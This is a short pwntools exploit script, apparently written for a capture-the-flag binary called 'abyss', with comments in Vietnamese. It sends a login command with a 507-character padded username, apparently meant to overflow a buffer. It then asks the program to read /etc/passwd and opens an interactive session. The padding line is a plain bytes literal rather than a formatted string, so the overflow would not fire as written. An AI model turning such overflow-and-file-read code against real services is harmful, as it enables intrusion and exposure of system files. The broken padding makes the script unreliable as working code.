from pwn import *

p = process('./abyss')
#input()
# Gửi lệnh LOGIN
p.send(p32(0))  # LOGIN = 0
a='a'*(512-5)
p.send(b"USER {a}\n")
p.send(b"PASS son\n")
input()
# Gửi lệnh READ file (ví dụ: /etc/passwd)
p.send(p32(1))  # READ = 1
p.send(b"/etc/passwd\n")

# Gửi EXIT
p.send(p32(2))  # EXIT = 2

p.interactive()
